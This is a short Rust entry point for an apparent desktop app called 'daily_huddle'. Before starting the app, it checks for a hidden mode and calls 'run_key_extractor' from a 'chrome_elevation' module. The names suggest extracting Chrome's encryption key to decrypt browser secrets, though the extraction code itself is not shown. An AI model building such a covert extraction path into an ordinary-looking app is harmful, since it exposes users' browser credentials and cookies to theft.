// Prevents additional console window on Windows, DO NOT REMOVE!!
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

fn main() {
    if daily_huddle_lib::chrome_elevation::is_key_extractor_mode() {
        daily_huddle_lib::chrome_elevation::run_key_extractor();
    }
    daily_huddle_lib::run();
}
